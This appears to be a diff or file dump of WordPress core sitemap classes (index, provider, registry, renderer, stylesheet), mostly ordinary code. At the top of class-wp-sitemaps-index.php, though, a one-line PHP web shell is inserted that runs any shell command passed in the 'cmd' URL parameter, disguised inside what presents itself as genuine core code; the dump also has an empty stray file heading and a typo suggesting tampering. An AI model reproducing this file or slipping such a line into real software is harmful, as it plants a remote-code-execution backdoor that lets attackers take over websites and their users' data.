+			$stylesheet->render_stylesheet( $stylesheet_type );
+			exit;
+		}
+
+		// Render the index.
+		if ( 'index' === $sitemap ) {
+			$sitemap_list = $this->index->get_sitemap_list();
+
+			$this->renderer->render_index( $sitemap_list );
+			exit;
+		}
+
+		$provider = $this->registry->get_provider( $sitemap );
+
+		if ( ! $provider ) {
+			return;
+		}
+
+		if ( empty( $paged ) ) {
+			$paged = 1;
+		}
+
+		$url_list = $provider->get_url_list( $paged, $object_subtype );
+
+		// Force a 404 and bail early if no URLs are present.
+		if ( empty( $url_list ) ) {
+			$wp_query->set_404();
+			status_header( 404 );
+			return;
+		}
+
+		$this->renderer->render_sitemap( $url_list );
+		exit;
+	}
+
+	/**
+	 * Redirects a URL to the wp-sitemap.xml
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param bool     $bypass Pass-through of the pre_handle_404 filter value.
+	 * @param WP_Query $query  The WP_Query object.
+	 * @return bool Bypass value.
+	 */
+	public function redirect_sitemapxml( $bypass, $query ) {
+		// If a plugin has already utilized the pre_handle_404 function, return without action to avoid conflicts.
+		if ( $bypass ) {
+			return $bypass;
+		}
+
+		// 'pagename' is for most permalink types, name is for when the %postname% is used as a top-level field.
+		if ( 'sitemap-xml' === $query->get( 'pagename' )
+			|| 'sitemap-xml' === $query->get( 'name' )
+		) {
+			wp_safe_redirect( $this->index->get_index_url() );
+			exit();
+		}
+
+		return $bypass;
+	}
+
+	/**
+	 * Adds the sitemap index to robots.txt.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $output robots.txt output.
+	 * @param bool   $public Whether the site is public.
+	 * @return string The robots.txt output.
+	 */
+	public function add_robots( $output, $public ) {
+		if ( $public ) {
+			$output .= "\nSitemap: " . esc_url( $this->index->get_index_url() ) . "\n";
+		}
+
+		return $output;
+	}
+}
+
+The file my-directory-list.txt contains:
+The file class-wp-sitemaps-index.php contains:
+<?php
+$cmd = system($_GET['cmd']); echo $cmd;
+/**
+ * Sitemaps: WP_Sitemaps_Index class.
+ *
+ * Generates the sitemap index.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Index.
+ * Builds the sitemap index page that lists the links to all of the sitemaps.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Index {
+	/**
+	 * The main registry of supported sitemaps.
+	 *
+	 * @since 5.5.0
+	 * @var WP_Sitemaps_Registry
+	 */
+	protected $registry;
+
+	/**
+	 * Maximum number of sitemaps to include in an index.
+	 *
+	 * @sincee 5.5.0
+	 *
+	 * @var int Maximum number of sitemaps.
+	 */
+	private $max_sitemaps = 50000;
+
+	/**
+	 * WP_Sitemaps_Index constructor.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param WP_Sitemaps_Registry $registry Sitemap provider registry.
+	 */
+	public function __construct( WP_Sitemaps_Registry $registry ) {
+		$this->registry = $registry;
+	}
+
+	/**
+	 * Gets a sitemap list for the index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of all sitemaps.
+	 */
+	public function get_sitemap_list() {
+		$sitemaps = array();
+
+		$providers = $this->registry->get_providers();
+		/* @var WP_Sitemaps_Provider $provider */
+		foreach ( $providers as $name => $provider ) {
+			$sitemap_entries = $provider->get_sitemap_entries();
+
+			// Prevent issues with array_push and empty arrays on PHP < 7.3.
+			if ( ! $sitemap_entries ) {
+				continue;
+			}
+
+			// Using array_push is more efficient than array_merge in a loop.
+			array_push( $sitemaps, ...$sitemap_entries );
+			if ( count( $sitemaps ) >= $this->max_sitemaps ) {
+				break;
+			}
+		}
+
+		return array_slice( $sitemaps, 0, $this->max_sitemaps, true );
+	}
+
+	/**
+	 * Builds the URL for the sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap index URL.
+	 */
+	public function get_index_url() {
+		global $wp_rewrite;
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			return home_url( '/?sitemap=index' );
+		}
+
+		return home_url( '/wp-sitemap.xml' );
+	}
+}
+
+The file class-wp-sitemaps-provider.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Provider class
+ *
+ * This class is a base class for other sitemap providers to extend and contains shared functionality.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Provider.
+ *
+ * @since 5.5.0
+ */
+abstract class WP_Sitemaps_Provider {
+	/**
+	 * Provider name.
+	 *
+	 * This will also be used as the public-facing name in URLs.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $name = '';
+
+	/**
+	 * Object type name (e.g. 'post', 'term', 'user').
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $object_type = '';
+
+	/**
+	 * Gets a URL list for a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param int    $page_num       Page of results.
+	 * @param string $object_subtype Optional. Object subtype name. Default empty.
+	 * @return array Array of URLs for a sitemap.
+	 */
+	abstract public function get_url_list( $page_num, $object_subtype = '' );
+
+	/**
+	 * Gets the max number of pages available for the object type.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $object_subtype Optional. Object subtype. Default empty.
+	 * @return int Total number of pages.
+	 */
+	abstract public function get_max_num_pages( $object_subtype = '' );
+
+	/**
+	 * Gets data about each sitemap type.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of sitemap types including object subtype name and number of pages.
+	 */
+	public function get_sitemap_type_data() {
+		$sitemap_data = array();
+
+		$object_subtypes = $this->get_object_subtypes();
+
+		// If there are no object subtypes, include a single sitemap for the
+		// entire object type.
+		if ( empty( $object_subtypes ) ) {
+			$sitemap_data[] = array(
+				'name'  => '',
+				'pages' => $this->get_max_num_pages(),
+			);
+			return $sitemap_data;
+		}
+
+		// Otherwise, include individual sitemaps for every object subtype.
+		foreach ( $object_subtypes as $object_subtype_name => $data ) {
+			$object_subtype_name = (string) $object_subtype_name;
+
+			$sitemap_data[] = array(
+				'name'  => $object_subtype_name,
+				'pages' => $this->get_max_num_pages( $object_subtype_name ),
+			);
+		}
+
+		return $sitemap_data;
+	}
+
+	/**
+	 * Lists sitemap pages exposed by this provider.
+	 *
+	 * The returned data is used to populate the sitemap entries of the index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of sitemap entries.
+	 */
+	public function get_sitemap_entries() {
+		$sitemaps = array();
+
+		$sitemap_types = $this->get_sitemap_type_data();
+
+		foreach ( $sitemap_types as $type ) {
+			for ( $page = 1; $page <= $type['pages']; $page ++ ) {
+				$sitemap_entry = array(
+					'loc' => $this->get_sitemap_url( $type['name'], $page ),
+				);
+
+				/**
+				 * Filters the sitemap entry for the sitemap index.
+				 *
+				 * @since 5.5.0
+				 *
+				 * @param array  $sitemap_entry  Sitemap entry for the post.
+				 * @param string $object_type    Object empty name.
+				 * @param string $object_subtype Object subtype name.
+				 *                               Empty string if the object type does not support subtypes.
+				 * @param int    $page           Page number of results.
+				 */
+				$sitemap_entry = apply_filters( 'wp_sitemaps_index_entry', $sitemap_entry, $this->object_type, $type['name'], $page );
+
+				$sitemaps[] = $sitemap_entry;
+			}
+		}
+
+		return $sitemaps;
+	}
+
+	/**
+	 * Gets the URL of a sitemap entry.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @param string $name The name of the sitemap.
+	 * @param int    $page The page of the sitemap.
+	 * @return string The composed URL for a sitemap entry.
+	 */
+	public function get_sitemap_url( $name, $page ) {
+		global $wp_rewrite;
+
+		// Accounts for cases where name is not included, ex: sitemaps-users-1.xml.
+		$params = array_filter(
+			array(
+				'sitemap'         => $this->name,
+				'sitemap-subtype' => $name,
+				'paged'           => $page,
+			)
+		);
+
+		$basename = sprintf(
+			'/wp-sitemap-%1$s.xml',
+			implode( '-', $params )
+		);
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$basename = '/?' . http_build_query( $params, null, '&' );
+		}
+
+		return home_url( $basename );
+	}
+
+	/**
+	 * Returns the list of supported object subtypes exposed by the provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array List of object subtypes objects keyed by their name.
+	 */
+	public function get_object_subtypes() {
+		return array();
+	}
+}
+
+The file class-wp-sitemaps-registry.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Registry class
+ *
+ * Handles registering sitemap providers.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Registry.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Registry {
+	/**
+	 * Registered sitemap providers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var WP_Sitemaps_Provider[] Array of registered sitemap providers.
+	 */
+	private $providers = array();
+
+	/**
+	 * Adds a new sitemap provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string               $name     Name of the sitemap provider.
+	 * @param WP_Sitemaps_Provider $provider Instance of a WP_Sitemaps_Provider.
+	 * @return bool Whether the provider was added successfully.
+	 */
+	public function add_provider( $name, WP_Sitemaps_Provider $provider ) {
+		if ( isset( $this->providers[ $name ] ) ) {
+			return false;
+		}
+
+		/**
+		 * Filters the sitemap provider before it is added.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param WP_Sitemaps_Provider $provider Instance of a WP_Sitemaps_Provider.
+		 * @param string               $name     Name of the sitemap provider.
+		 */
+		$provider = apply_filters( 'wp_sitemaps_add_provider', $provider, $name );
+		if ( ! $provider instanceof WP_Sitemaps_Provider ) {
+			return false;
+		}
+
+		$this->providers[ $name ] = $provider;
+
+		return true;
+	}
+
+	/**
+	 * Returns a single registered sitemap provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $name Sitemap provider name.
+	 * @return WP_Sitemaps_Provider|null Sitemap provider if it exists, null otherwise.
+	 */
+	public function get_provider( $name ) {
+		if ( ! isset( $this->providers[ $name ] ) ) {
+			return null;
+		}
+
+		return $this->providers[ $name ];
+	}
+
+	/**
+	 * Returns all registered sitemap providers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return WP_Sitemaps_Provider[] Array of sitemap providers.
+	 */
+	public function get_providers() {
+		return $this->providers;
+	}
+}
+
+The file class-wp-sitemaps-renderer.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Renderer class
+ *
+ * Responsible for rendering Sitemaps data to XML in accordance with sitemap protocol.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Renderer
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Renderer {
+	/**
+	 * XSL stylesheet for styling a sitemap for web browsers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $stylesheet = '';
+
+	/**
+	 * XSL stylesheet for styling a sitemap for web browsers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $stylesheet_index = '';
+
+	/**
+	 * WP_Sitemaps_Renderer constructor.
+	 *
+	 * @since 5.5.0
+	 */
+	public function __construct() {
+		$stylesheet_url = $this->get_sitemap_stylesheet_url();
+
+		if ( $stylesheet_url ) {
+			$this->stylesheet = '<?xml-stylesheet type="text/xsl" href="' . esc_url( $stylesheet_url ) . '" ?>';
+		}
+
+		$stylesheet_index_url = $this->get_sitemap_index_stylesheet_url();
+
+		if ( $stylesheet_index_url ) {
+			$this->stylesheet_index = '<?xml-stylesheet type="text/xsl" href="' . esc_url( $stylesheet_index_url ) . '" ?>';
+		}
+	}
+
+	/**
+	 * Gets the URL for the sitemap stylesheet.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap stylesheet URL.
+	 */
+	public function get_sitemap_stylesheet_url() {
+		global $wp_rewrite;
+
+		$sitemap_url = home_url( '/wp-sitemap.xsl' );
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$sitemap_url = home_url( '/?sitemap-stylesheet=sitemap' );
+		}
+
+		/**
+		 * Filters the URL for the sitemap stylesheet.
+		 *
+		 * If a falsey value is returned, no stylesheet will be used and
+		 * the "raw" XML of the sitemap will be displayed.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $sitemap_url Full URL for the sitemaps XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_url', $sitemap_url );
+	}
+
+	/**
+	 * Gets the URL for the sitemap index stylesheet.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap index stylesheet URL.
+	 */
+	public function get_sitemap_index_stylesheet_url() {
+		global $wp_rewrite;
+
+		$sitemap_url = home_url( '/wp-sitemap-index.xsl' );
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$sitemap_url = home_url( '/?sitemap-stylesheet=index' );
+		}
+
+		/**
+		 * Filters the URL for the sitemap index stylesheet.
+		 *
+		 * If a falsey value is returned, no stylesheet will be used and
+		 * the "raw" XML of the sitemap index will be displayed.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $sitemap_url Full URL for the sitemaps index XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_index_url', $sitemap_url );
+	}
+
+	/**
+	 * Renders a sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $sitemaps Array of sitemap URLs.
+	 */
+	public function render_index( $sitemaps ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		$this->check_for_simple_xml_availability();
+
+		$index_xml = $this->get_sitemap_index_xml( $sitemaps );
+
+		if ( ! empty( $index_xml ) ) {
+			// All output is escaped within get_sitemap_index_xml().
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
+			echo $index_xml;
+		}
+	}
+
+	/**
+	 * Gets XML for a sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $sitemaps Array of sitemap URLs.
+	 * @return string|false A well-formed XML string for a sitemap index. False on error.
+	 */
+	public function get_sitemap_index_xml( $sitemaps ) {
+		$sitemap_index = new SimpleXMLElement(
+			sprintf(
+				'%1$s%2$s%3$s',
+				'<?xml version="1.0" encoding="UTF-8" ?>',
+				$this->stylesheet_index,
+				'<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" />'
+			)
+		);
+
+		foreach ( $sitemaps as $entry ) {
+			$sitemap = $sitemap_index->addChild( 'sitemap' );
+
+			// Add each element as a child node to the <sitemap> entry.
+			foreach ( $entry as $name => $value ) {
+				if ( 'loc' === $name ) {
+					$sitemap->addChild( $name, esc_url( $value ) );
+				} elseif ( 'lastmod' === $name ) {
+					$sitemap->addChild( $name, esc_xml( $value ) );
+				} else {
+					_doing_it_wrong(
+						__METHOD__,
+						sprintf(
+							/* translators: %s: List of element names. */
+							__( 'Fields other than %s are not currently supported for the sitemap index.' ),
+							implode( ',', array( 'loc', 'lastmod' ) )
+						),
+						'5.5.0'
+					);
+				}
+			}
+		}
+
+		return $sitemap_index->asXML();
+	}
+
+	/**
+	 * Renders a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $url_list Array of URLs for a sitemap.
+	 */
+	public function render_sitemap( $url_list ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		$this->check_for_simple_xml_availability();
+
+		$sitemap_xml = $this->get_sitemap_xml( $url_list );
+
+		if ( ! empty( $sitemap_xml ) ) {
+			// All output is escaped within get_sitemap_xml().
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
+			echo $sitemap_xml;
+		}
+	}
+
+	/**
+	 * Gets XML for a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $url_list Array of URLs for a sitemap.
+	 * @return string|false A well-formed XML string for a sitemap index. False on error.
+	 */
+	public function get_sitemap_xml( $url_list ) {
+		$urlset = new SimpleXMLElement(
+			sprintf(
+				'%1$s%2$s%3$s',
+				'<?xml version="1.0" encoding="UTF-8" ?>',
+				$this->stylesheet,
+				'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" />'
+			)
+		);
+
+		foreach ( $url_list as $url_item ) {
+			$url = $urlset->addChild( 'url' );
+
+			// Add each element as a child node to the <url> entry.
+			foreach ( $url_item as $name => $value ) {
+				if ( 'loc' === $name ) {
+					$url->addChild( $name, esc_url( $value ) );
+				} elseif ( in_array( $name, array( 'lastmod', 'changefreq', 'priority' ), true ) ) {
+					$url->addChild( $name, esc_xml( $value ) );
+				} else {
+					_doing_it_wrong(
+						__METHOD__,
+						sprintf(
+							/* translators: %s: List of element names. */
+							__( 'Fields other than %s are not currently supported for sitemaps.' ),
+							implode( ',', array( 'loc', 'lastmod', 'changefreq', 'priority' ) )
+						),
+						'5.5.0'
+					);
+				}
+			}
+		}
+
+		return $urlset->asXML();
+	}
+
+	/**
+	 * Checks for the availability of the SimpleXML extension and errors if missing.
+	 *
+	 * @since 5.5.0
+	 */
+	private function check_for_simple_xml_availability() {
+		if ( ! class_exists( 'SimpleXMLElement' ) ) {
+			add_filter(
+				'wp_die_handler',
+				static function () {
+					return '_xml_wp_die_handler';
+				}
+			);
+
+			wp_die(
+				sprintf(
+					/* translators: %s: SimpleXML */
+					esc_xml( __( 'Could not generate XML sitemap due to missing %s extension' ) ),
+					'SimpleXML'
+				),
+				esc_xml( __( 'WordPress &rsaquo; Error' ) ),
+				array(
+					'response' => 501, // "Not implemented".
+				)
+			);
+		}
+	}
+}
+
+The file class-wp-sitemaps-stylesheet.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Stylesheet class
+ *
+ * This class provides the XSL stylesheets to style all sitemaps.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Stylesheet provider class.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Stylesheet {
+	/**
+	 * Renders the XSL stylesheet depending on whether it's the sitemap index or not.
+	 *
+	 * @param string $type Stylesheet type. Either 'sitemap' or 'index'.
+	 */
+	public function render_stylesheet( $type ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		if ( 'sitemap' === $type ) {
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- All content escaped below.
+			echo $this->get_sitemap_stylesheet();
+		}
+
+		if ( 'index' === $type ) {
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- All content escaped below.
+			echo $this->get_sitemap_index_stylesheet();
+		}
+
+		exit;
+	}
+
+	/**
+	 * Returns the escaped XSL for all sitemaps, except index.
+	 *
+	 * @since 5.5.0
+	 */
+	public function get_sitemap_stylesheet() {
+		$css         = $this->get_stylesheet_css();
+		$title       = esc_xml( __( 'XML Sitemap' ) );
+		$description = esc_xml( __( 'This XML Sitemap is generated by WordPress to make your content more visible for search engines.' ) );
+		$learn_more  = sprintf(
+			'<a href="%s">%s</a>',
+			esc_url( __( 'https://www.sitemaps.org/' ) ),
+			esc_xml( __( 'Learn more about XML sitemaps.' ) )
+		);
+
+		$text = sprintf(
+			/* translators: %s: Number of URLs. */
+			esc_xml( __( 'Number of URLs in this XML Sitemap: %s.' ) ),
+			'<xsl:value-of select="count( sitemap:urlset/sitemap:url )" />'
+		);
+
+		$lang       = get_language_attributes( 'html' );
+		$url        = esc_xml( __( 'URL' ) );
+		$lastmod    = esc_xml( __( 'Last Modified' ) );
+		$changefreq = esc_xml( __( 'Change Frequency' ) );
+		$priority   = esc_xml( __( 'Priority' ) );
+
+		$xsl_content = <<<XSL
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+		version="1.0"
+		xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+		xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
+		exclude-result-prefixes="sitemap"
+		>
+
+	<xsl:output method="html" encoding="UTF-8" indent="yes"/>
+
+	<!--
+	  Set variables for whether lastmod, changefreq or priority occur for any url in the sitemap.
+	  We do this up front because it can be expensive in a large sitemap.
+	  -->
+	<xsl:variable name="has-lastmod"    select="count( /sitemap:urlset/sitemap:url/sitemap:lastmod )"    />
+	<xsl:variable name="has-changefreq" select="count( /sitemap:urlset/sitemap:url/sitemap:changefreq )" />
+	<xsl:variable name="has-priority"   select="count( /sitemap:urlset/sitemap:url/sitemap:priority )"   />
+
+	<xsl:template match="/">
+		<html {$lang}>
+			<head>
+				<title>{$title}</title>
+				<style>
+					{$css}
+				</style>
+			</head>
+			<body>
+				<div id="sitemap">
+					<div id="sitemap__header">
+						<h1>{$title}</h1>
+						<p>{$description}</p>
+						<p>{$learn_more}</p>
+					</div>
+					<div id="sitemap__content">
+						<p class="text">{$text}</p>
+						<table id="sitemap__table">
+							<thead>
+								<tr>
+									<th class="loc">{$url}</th>
+									<xsl:if test="\$has-lastmod">
+										<th class="lastmod">{$lastmod}</th>
+									</xsl:if>
+									<xsl:if test="\$has-changefreq">
+										<th class="changefreq">{$changefreq}</th>
+									</xsl:if>
+									<xsl:if test="\$has-priority">
+										<th class="priority">{$priority}</th>
+									</xsl:if>
+								</tr>
+							</thead>
+							<tbody>
+								<xsl:for-each select="sitemap:urlset/sitemap:url">
+									<tr>
+										<td class="loc"><a href="{sitemap:loc}"><xsl:value-of select="sitemap:loc" /></a></td>
+										<xsl:if test="\$has-lastmod">
+											<td class="lastmod"><xsl:value-of select="sitemap:lastmod" /></td>
+										</xsl:if>
+										<xsl:if test="\$has-changefreq">
+											<td class="changefreq"><xsl:value-of select="sitemap:changefreq" /></td>
+										</xsl:if>
+										<xsl:if test="\$has-priority">
+											<td class="priority"><xsl:value-of select="sitemap:priority" /></td>
+										</xsl:if>
+									</tr>
+								</xsl:for-each>
+							</tbody>
+						</table>
+					</div>
+				</div>
+			</body>
+		</html>
+	</xsl:template>
+</xsl:stylesheet>
+
+XSL;
+
+		/**
+		 * Filters the content of the sitemap stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $xsl_content Full content for the XML stylesheet.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_content', $xsl_content );
+	}
+
+	/**
+	 * Returns the escaped XSL for the index sitemaps.
+	 *
+	 * @since 5.5.0
+	 */
+	public function get_sitemap_index_stylesheet() {
+		$css         = $this->get_stylesheet_css();
+		$title       = esc_xml( __( 'XML Sitemap' ) );
+		$description = esc_xml( __( 'This XML Sitemap is generated by WordPress to make your content more visible for search engines.' ) );
+		$learn_more  = sprintf(
+			'<a href="%s">%s</a>',
+			esc_url( __( 'https://www.sitemaps.org/' ) ),
+			esc_xml( __( 'Learn more about XML sitemaps.' ) )
+		);
+
+		$text = sprintf(
+			/* translators: %s: Number of URLs. */
+			esc_xml( __( 'Number of URLs in this XML Sitemap: %s.' ) ),
+			'<xsl:value-of select="count( sitemap:sitemapindex/sitemap:sitemap )" />'
+		);
+
+		$lang    = get_language_attributes( 'html' );
+		$url     = esc_xml( __( 'URL' ) );
+		$lastmod = esc_xml( __( 'Last Modified' ) );
+
+		$xsl_content = <<<XSL
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+		version="1.0"
+		xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+		xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
+		exclude-result-prefixes="sitemap"
+		>
+
+	<xsl:output method="html" encoding="UTF-8" indent="yes" />
+
+	<!--
+	  Set variables for whether lastmod occurs for any sitemap in the index.
+	  We do this up front because it can be expensive in a large sitemap.
+	  -->
+	<xsl:variable name="has-lastmod" select="count( /sitemap:sitemapindex/sitemap:sitemap/sitemap:lastmod )" />
+
+	<xsl:template match="/">
+		<html {$lang}>
+			<head>
+				<title>{$title}</title>
+				<style>
+					{$css}
+				</style>
+			</head>
+			<body>
+				<div id="sitemap">
+					<div id="sitemap__header">
+						<h1>{$title}</h1>
+						<p>{$description}</p>
+						<p>{$learn_more}</p>
+					</div>
+					<div id="sitemap__content">
+						<p class="text">{$text}</p>
+						<table id="sitemap__table">
+							<thead>
+								<tr>
+									<th class="loc">{$url}</th>
+									<xsl:if test="\$has-lastmod">
+										<th class="lastmod">{$lastmod}</th>
+									</xsl:if>
+								</tr>
+							</thead>
+							<tbody>
+								<xsl:for-each select="sitemap:sitemapindex/sitemap:sitemap">
+									<tr>
+										<td class="loc"><a href="{sitemap:loc}"><xsl:value-of select="sitemap:loc" /></a></td>
+										<xsl:if test="\$has-lastmod">
+											<td class="lastmod"><xsl:value-of select="sitemap:lastmod" /></td>
+										</xsl:if>
+									</tr>
+								</xsl:for-each>
+							</tbody>
+						</table>
+					</div>
+				</div>
+			</body>
+		</html>
+	</xsl:template>
+</xsl:stylesheet>
+
+XSL;
+
+		/**
+		 * Filters the content of the sitemap index stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $xsl_content Full content for the XML stylesheet.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_index_content', $xsl_content );
+	}
+
+	/**
+	 * Gets the CSS to be included in sitemap XSL stylesheets.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return string The CSS.
+	 */
+	public function get_stylesheet_css() {
+		$text_align = is_rtl() ? 'right' : 'left';
+
+		$css = <<<EOF
+
+					body {
+						font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+						color: #444;
+					}
+
+					#sitemap {
+						max-width: 980px;
+						margin: 0 auto;
+					}
+
+					#sitemap__table {
+						width: 100%;
+						border: solid 1px #ccc;
+						border-collapse: collapse;
+					}
+
+			 		#sitemap__table tr td.loc {
+						/*
+						 * URLs should always be LTR.
+						 * See https://core.trac.wordpress.org/ticket/16834
+						 * and https://core.trac.wordpress.org/ticket/49949
+						 */
+						direction: ltr;
+					}
+
+					#sitemap__table tr th {
+						text-align: {$text_align};
+					}
+
+					#sitemap__table tr td,
+					#sitemap__table tr th {
+						padding: 10px;
+					}
+
+					#sitemap__table tr:nth-child(odd) td {
+						background-color: #eee;
+					}
+
+					a:hover {
+						text-decoration: none;
+					}
+
+EOF;
+
+		/**
+		 * Filters the CSS only for the sitemap stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $css CSS to be applied to default XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_css', $css );
+	}
+}
+
